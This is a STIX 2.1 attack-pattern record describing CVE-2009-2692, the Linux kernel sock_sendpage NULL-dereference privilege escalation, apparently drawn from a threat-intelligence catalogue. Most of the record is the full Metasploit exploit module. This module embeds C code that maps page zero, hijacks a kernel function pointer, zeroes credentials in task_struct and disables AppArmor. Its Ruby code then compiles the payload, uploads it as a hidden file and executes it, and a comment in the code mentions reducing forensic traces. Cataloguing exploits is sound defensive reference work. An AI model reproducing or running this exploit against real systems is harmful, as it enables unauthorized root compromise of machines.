{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e0f05c8b-9672-4b80-91ea-3f1e1a3f35a6",
    "created": "2024-08-14T16:58:59.53162Z",
    "modified": "2024-08-14T16:58:59.531624Z",
    "name": "Linux Kernel Sendpage Local Privilege Escalation",
    "description": " The Linux kernel failed to properly initialize some entries in the proto_ops struct for several protocols, leading to NULL being dereferenced and used as a function pointer. By using mmap(2) to map page 0, an attacker can execute arbitrary code in the context of the kernel.  Several public exploits exist for this vulnerability, including spender's wunderbar_emporium and rcvalle's ppc port, sock_sendpage.c.  All Linux 2.4/2.6 versions since May 2001 are believed to be affected: 2.4.4 up to and including 2.4.37.4; 2.6.0 up to and including 2.6.30.4  This module has been tested successfully on CentOS 5.0 (i386) with kernel version 2.6.18-8.1.1.tl5; and Debian 3.1r8 Sarge (i686) with kernel version 2.4.27-3-386.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/sock_sendpage.rb",
            "external_id": "sock_sendpage.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2692"
        },
        {
            "source_name": "reference",
            "url": "https://www.securityfocus.com/archive/1/505751"
        },
        {
            "source_name": "reference",
            "url": "http://blog.cr0.org/2009/08/linux-null-pointer-dereference-due-to.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Local::LinuxKernel\n  include Msf::Exploit::Local::Linux\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Linux Kernel Sendpage Local Privilege Escalation',\n      'Description'    => %q{\n        The Linux kernel failed to properly initialize some entries in the\n        proto_ops struct for several protocols, leading to NULL being\n        dereferenced and used as a function pointer. By using mmap(2) to map\n        page 0, an attacker can execute arbitrary code in the context of the\n        kernel.\n\n        Several public exploits exist for this vulnerability, including\n        spender's wunderbar_emporium and rcvalle's ppc port, sock_sendpage.c.\n\n        All Linux 2.4/2.6 versions since May 2001 are believed to be affected:\n        2.4.4 up to and including 2.4.37.4; 2.6.0 up to and including 2.6.30.4\n\n        This module has been tested successfully on CentOS 5.0 (i386) with\n        kernel version 2.6.18-8.1.1.tl5; and Debian 3.1r8 Sarge (i686) with\n        kernel version 2.4.27-3-386.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Tavis Ormandy',                     # discovery\n          'Julien Tinnes <julien at cr0.org>', # discovery\n          'spender',                           # wunderbar_emporium.tgz\n          'rcvalle',                           # sock_sendpage.c\n          'egypt'                              # metasploit module\n        ],\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-2692' ],\n          [ 'EDB', '9545' ],\n          [ 'EDB', '9641' ],\n          [ 'BID', '36038' ],\n          [ 'URL', 'https://www.securityfocus.com/archive/1/505751' ],\n          [ 'URL', 'http://blog.cr0.org/2009/08/linux-null-pointer-dereference-due-to.html' ]\n        ],\n      'Targets'        =>\n        [\n          [ 'Linux x86', { 'Arch' => ARCH_X86 } ]\n        ],\n      'DisclosureDate' => '2009-08-13',\n      'Notes'          =>\n        {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_OS_DOWN ],\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptBool.new('DEBUG_EXPLOIT', [ true, \"Make the exploit executable be verbose about what it's doing\", false ])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def check\n    version = Rex::Version.new kernel_release.split('-').first\n\n    if version.to_s.eql? ''\n      vprint_error 'Could not determine the kernel version'\n      return CheckCode::Unknown\n    end\n\n    if version.between?(Rex::Version.new('2.4.4'), Rex::Version.new('2.4.37.4')) ||\n       version.between?(Rex::Version.new('2.6.0'), Rex::Version.new('2.6.30.4'))\n      vprint_good \"Kernel version #{version} appears to be vulnerable\"\n    else\n      vprint_error \"Kernel version #{version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n\n    arch = kernel_hardware\n    unless arch.include?('x86') || arch =~ /i\\d86/\n      vprint_error \"System architecture #{arch} is not supported\"\n      return CheckCode::Safe\n    end\n    if arch.include? 'x86_64'\n      vprint_error \"System architecture #{arch} is not supported\"\n      return CheckCode::Safe\n    end\n    vprint_good \"System architecture #{arch} is supported\"\n\n    mmap_min_addr_path = '/proc/sys/vm/mmap_min_addr'\n    if file_exist? mmap_min_addr_path\n      mmap_min_addr = read_file mmap_min_addr_path\n    else\n      mmap_min_addr = ''\n    end\n\n    case mmap_min_addr\n    when ''\n      vprint_good 'vm.mmap_min_addr is not set'\n    when '0'\n      vprint_good 'vm.mmap_min_addr is zero'\n    else\n      vprint_error \"vm.mmap_min_addr (#{mmap_min_addr}) is not zero\"\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    sc = Metasm::ELF.new @cpu\n    sc.parse %Q|\n      #ifdef __ELF__\n        .section \".bss\" rwx\n        .section \".text\" rwx\n      #endif\n    |\n    current_task_struct_h sc\n\n    if datastore['DEBUG_EXPLOIT']\n      cparser.parse \"#define DEBUG\\n\"\n    end\n\n    main = %q^\n\nstruct _IO_FILE;\ntypedef void _IO_lock_t;\n\nstruct _IO_marker {\n        struct _IO_marker *_next;\n        struct _IO_FILE *_sbuf;\n        int _pos;\n};\ntypedef unsigned int __gid_t;\ntypedef long __off_t;\ntypedef int __pid_t;\ntypedef\nstruct {\n        long __val[2];\n} __quad_t;\ntypedef int __ssize_t;\ntypedef unsigned int __uid_t;\nextern void exit(int __status);\nextern int open(const char *__file, int __oflag, ...);\nextern void perror(const char *__s);\nextern int printf(const char *__format, ...);\ntypedef unsigned long size_t;\nextern int socket(int __domain, int __type, int __protocol);\nextern int strcmp(const char *__s1, const char *__s2);\nextern int unlink(const char *__name);\n\ntypedef __quad_t __off64_t;\nextern __pid_t fork(void);\nextern int ftruncate(int __fd, __off_t __length);\nextern __gid_t getgid(void);\nextern __uid_t getuid(void);\nextern void *mmap(void *__addr, size_t __len, int __prot, int __flags, int __fd, __off_t __offset);\nextern int mprotect(void *__addr, size_t __len, int __prot);\ntypedef __off_t off_t;\ntypedef __ssize_t ssize_t;\n\nstruct _IO_FILE {\n        int _flags;\n        char *_IO_read_ptr;\n        char *_IO_read_end;\n        char *_IO_read_base;\n        char *_IO_write_base;\n        char *_IO_write_ptr;\n        char *_IO_write_end;\n        char *_IO_buf_base;\n        char *_IO_buf_end;\n        char *_IO_save_base;\n        char *_IO_backup_base;\n        char *_IO_save_end;\n        struct _IO_marker *_markers;\n        struct _IO_FILE *_chain;\n        int _fileno;\n        int _flags2;\n        __off_t _old_offset;\n        unsigned short _cur_column;\n        signed char _vtable_offset;\n        char _shortbuf[1];\n        _IO_lock_t *_lock;\n        __off64_t _offset;\n        void *__pad1;\n        void *__pad2;\n        void *__pad3;\n        void *__pad4;\n        size_t __pad5;\n        int _mode;\n        char _unused2[40];\n};\nextern ssize_t sendfile(int __out_fd, int __in_fd, off_t *__offset, size_t __count);\n\ntypedef struct _IO_FILE FILE;\n\nextern int fclose(FILE *__stream);\nextern FILE *fopen(const char *__filename, const char *__modes);\nextern int fscanf(FILE *__stream, const char *__format, ...);\n\n\n// Refactor missed these, added manually by the simple expedient of\n// printf\n#define PF_BLUETOOTH 31\n#define PF_APPLETALK 5\n#define PF_IPX       4\n#define PF_IRDA      23\n#define PF_X25       9\n#define PF_AX25      3\n#define PF_PPPOX     24\n\n#define EOF -1\n\n#define MAP_PRIVATE   0x02\n#define MAP_FIXED     0x10\n#define MAP_ANONYMOUS 0x20\n#define MAP_ANON MAP_ANONYMOUS\n#define MAP_FAILED ((void *)-1)\n\n#define PROT_READ  0x1\n#define PROT_WRITE 0x2\n#define PROT_EXEC  0x4\n\n#define O_CREAT 64\n#define O_RDWR 2\n\n#define SOCK_DGRAM  2\n\n\n/*\n#include <errno.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdarg.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/sendfile.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <unistd.h>\n*/\n\n// Only print to stdout if we're debugging. This reduces our forensics\n// footprint a touch by preventing our debugging strings from showing up\n// in the binary when using the exploit for reals.\n#ifdef DEBUG\n# define dprintf printf\n#else\n# define dprintf\n#endif\n\n#undef fscanf\n\n#ifdef __x86_64__\n#define PTR_FMT \"0x%016x\"\n#else\n#define PTR_FMT \"0x%08x\"\n#endif\n\n#define NULL ((void*)0)\n#define DOMAINS_STOP -1\n\nconst int domains[] = {\n  PF_BLUETOOTH,\n  PF_APPLETALK,\n  PF_IPX,\n  PF_IRDA,\n  PF_X25,\n  PF_AX25,\n  PF_BLUETOOTH,\n  PF_PPPOX,\n  DOMAINS_STOP\n  };\n\nint *apparmor_enabled;\n\nint got_ring0 = 0;\nunsigned long uid, gid;\n\n/*\nstatic unsigned long get_kernel_sym(char *name)\n{\n  FILE *f;\n  unsigned long addr;\n  char dummy;\n  char sname[256];\n  int ret;\n\n  f = fopen(\"/proc/kallsyms\", \"r\");\n  if (f == NULL) {\n    f = fopen(\"/proc/ksyms\", \"r\");\n    if (f == NULL) {\n      dprintf(\"Unable to obtain symbol listing!\\n\");\n      return 0;\n    }\n  }\n\n  ret = 0;\n  while(ret != EOF) {\n    ret = fscanf(f, \"%p %c %s\\n\", (void **)&addr, &dummy, sname);\n    if (ret == 0) {\n      fscanf(f, \"%s\\n\", sname);\n      continue;\n    }\n    if (!strcmp(name, sname)) {\n      dprintf(\" [+] Resolved %s to %p\\n\", name, (void *)addr);\n      fclose(f);\n      return addr;\n    }\n  }\n\n  fclose(f);\n  return 0;\n}\n*/\n\nstatic void\nchange_cred(void)\n{\n  unsigned int *task_struct;\n\n  task_struct = (unsigned int *)current_task_struct();\n\n  while (task_struct) {\n    if (task_struct[0] == uid && task_struct[1] == uid &&\n        task_struct[2] == uid && task_struct[3] == uid &&\n        task_struct[4] == gid && task_struct[5] == gid &&\n        task_struct[6] == gid && task_struct[7] == gid) {\n      task_struct[0] = task_struct[1] =\n      task_struct[2] = task_struct[3] =\n      task_struct[4] = task_struct[5] =\n      task_struct[6] = task_struct[7] = 0;\n      break;\n    }\n\n    task_struct++;\n  }\n\n  return;\n}\n\nint __attribute__((regparm(3)))\nown_the_kernel(unsigned long a, unsigned long b, unsigned long c, unsigned long d, unsigned long e)\n{\n\n  got_ring0 = 1;\n  if (apparmor_enabled && *apparmor_enabled) {\n    *apparmor_enabled = 0;\n  }\n  change_cred();\n  return -1;\n}\n\nSHELLCODE\n\nint shellcode_size = 0;\n\nint main(int argc, char **argv) {\n  int i = 0;\n  int d;\n  int in_fd, out_fd;\n  char *mapped;\n  char template[] = \"/tmp/sendfile.XXXXXX\";\n  int (*func)();\n\n  dprintf(\"argv[0] = %s\\n\", argv[0]);\n  unlink(argv[0]);\n\n  uid = getuid(), gid = getgid();\n\n  mapped = mmap(NULL , 0x1000,\n      PROT_READ | PROT_WRITE | PROT_EXEC,\n      MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS,\n      0, 0\n    );\n  if (mapped == NULL) {\n    dprintf(\"Mapped zero page!\\n\");\n  } else {\n    exit(1);\n  }\n\n  // jmp dword near [dword 0x8]\n  mapped[0] = '\\xff';\n  mapped[1] = '\\x25';\n  *(unsigned long *)&mapped[2] = 8;\n  *(unsigned long *)&mapped[8] = (unsigned long)own_the_kernel;\n\n  for (i = 0; i < 16; i++) {\n    dprintf(\"\\\\\\\\x%02x\", (unsigned char)mapped[i]);\n  }\n  dprintf(\"\\n\");\n\n  for (d = 0; domains[d] != DOMAINS_STOP; d++) {\n    //dprintf(\"Next domain ... \");\n    out_fd = socket(domains[d], SOCK_DGRAM, 0);\n    if (out_fd > 0) {\n      dprintf(\"Got domain[%d]\\n\", d);\n      break;\n    }\n    if (out_fd < 0) {\n      perror(\"socket\");\n      exit(1);\n    }\n  }\n\n  unlink(template);\n  // Couldn't get mkstemp to work, just use open(2) for now\n  in_fd = open(template, O_CREAT | O_RDWR, 0777);\n  dprintf(\"Opened temp file: %d\\n\", in_fd);\n  unlink(template);\n  dprintf(\"Calling ftruncate\\n\");\n  ftruncate(in_fd, 4096);\n\n  dprintf(\"got_ring0 addr: \" PTR_FMT \"\\n\", &got_ring0);\n  dprintf(\"Calling sendfile(%d, %d, %d, %d)\\n\", out_fd, in_fd, NULL, 4096);\n  sendfile(out_fd, in_fd, NULL, 4096);\n  dprintf(\"got_ring0: \" PTR_FMT \", %d\\n\", &got_ring0, got_ring0);\n  dprintf(\"UID: %d GID: %d\\n\", getuid(), getgid());\n\n  func = mmap(NULL, 0x1000,\n      PROT_READ | PROT_WRITE | PROT_EXEC,\n      MAP_PRIVATE | MAP_ANONYMOUS,\n      0, 0\n    );\n  mprotect(func, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);\n  // weaksauce memcpy so we don't have to #include <string.h>\n  dprintf(\"Copying %d bytes of shellcode\\n\", shellcode_size);\n  for (i = 0; i < shellcode_size; i++) {\n    (char)func[i] = (char)shellcode[i];\n  }\n  dprintf(\"Forking before calling shellcode: 0x%p\\n\", func);\n  //sigtrap();\n  if (fork()) {\n    exit(0);\n  }\n  func();\n\n  return got_ring0;\n}\n^\n\n    main.gsub!(/SHELLCODE/) do\n      # Split the payload into chunks and dump it out as a hex-escaped\n      # literal C string.\n      Rex::Text.to_c payload.encoded, 64, 'shellcode'\n    end\n    main.gsub!(/shellcode_size = 0/, \"shellcode_size = #{payload.encoded.length}\")\n\n    cparser.parse main, 'main.c'\n    #$stderr.puts cparser.factorize\n    #return\n\n    asm = cpu.new_ccompiler(cparser, sc).compile\n\n    sc.parse asm\n    sc.assemble\n    sc.c_set_default_entrypoint\n\n    begin\n      if sc.kind_of? Metasm::ELF\n        elf = sc.encode_string\n      else\n        foo = sc.encode_string\n        elf = Msf::Util::EXE.to_linux_x86_elf framework, foo\n      end\n    rescue\n      print_error \"Metasm Encoding failed: #{$!}\"\n      elog \"Metasm Encoding failed: #{$!.class} : #{$!}\"\n      elog \"Call stack:\\n#{$!.backtrace.join(\"\\n\")}\"\n      return\n    end\n\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric 8..12}\"\n\n    upload payload_path, elf\n    cmd_exec \"chmod +x #{payload_path}\"\n\n    print_status 'Executing payload...'\n    output = cmd_exec payload_path\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-08-13",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}